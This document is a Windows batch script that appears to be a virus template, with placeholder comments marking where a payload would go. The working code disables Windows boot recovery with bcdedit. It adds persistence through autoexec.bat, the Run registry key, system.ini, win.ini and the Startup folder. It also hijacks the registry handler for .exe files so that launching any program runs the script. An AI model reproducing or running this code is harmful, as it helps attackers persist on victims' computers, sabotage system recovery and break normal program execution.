@echo off
setlocal enableDelayedExpansion

REM copying whole script to autoexec.bat
attrib -r -h C:\autoexec.bat
echo.@echo off>>C:\autoexec.bat
echo.echo my virus would be here>>C:\autoexec.bat
echo.pause>>C:\autoexec.bat
attrib +r +h C:\autoexec.bat

REM setting current directory as mydir
set mydir=%~dp0

REM Disable recovery options
:: Disable Startup Repair from trying to start when a problem is detected
bcdedit /set recoveryenabled No

:: Disable Windows recovery at startup
bcdedit /set bootstatuspolicy ignoreallfailures

REM copy to C:\ 
copy %0 C:\startup.bat
goto startup

:startup
:: HAT
attrib -r -h C:\autoexec.bat
copy %0 C:\WinServ.bat >nul
type C:\autoexec.bat|find "WinServ.bat">C:\autoexec.bat
echo call C:\WinServ.bat>>C:\autoexec.bat
attrib +r +h C:\autoexec.bat

:: Registry
REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WinBoot /t REG_SZ /d C:\startup.bat

:: System.ini
copy %0 %windir%\WinDebug.bat
find /v /i "[boot]"<%WiNDir%\system.ini>temp1.tmp
find /v /i "shell=explorer.exe"<temp1.tmp>temp2.tmp
echo [boot]>%wIndIR%\system.ini
echo Shell=Explorer.exe WinDebug.bat>>%wiNdIR%\system.ini
type temp2.tmp>>%WIndIR%\system.ini
del temp?.tmp

:: Win.ini
copy %0 %windir%\TaskLoad.bat.
find /v /i "[windows]"<%windir%\win.ini>temp1.tmp
find /v /i "load="<temp1.tmp>temp2.tmp
find /v /i "run="<temp2.tmp>temp1.tmp
find /v /i "NullPort="<temp1.tmp>temp2.tmp
echo [windows]>%wiNdIR%\win.ini
echo load=TaskLoad.bat>>%winDIr%\win.ini
echo run=>>%wINDir%\win.ini
echo NullPort=None>>%windIr%\win.ini
type temp2.tmp>>%wiNDir%\win.ini
del temp?.tmp

:: Startup Folder
Copy %0 C:\startup.bat
copy C:\startup.bat "%UserProfile%\Start Menu\Programs\Startup"

:: Shell Spawning
opy %0 C:\startup.bat
echo.on error resume next>temp.vbs
echo set sh=createobject("wscript.shell")>>temp.vbs
echo sh.regwrite "HKCR\exefile\Shell\Open\Command","wscript.exe C:\CmdLoad.vbs ""%%1 %%*""">>temp.vbs
cscript temp.vbs
del temp.vbs
echo.set shell = createobject("wscript.shell")>>C:\CmdLoad.vbs
echo.shell.run "C:\startup.bat">>C:\CmdLoad.vbs

goto infect

:infect
REM this were you going to put your malware code

goto end

:end
exit
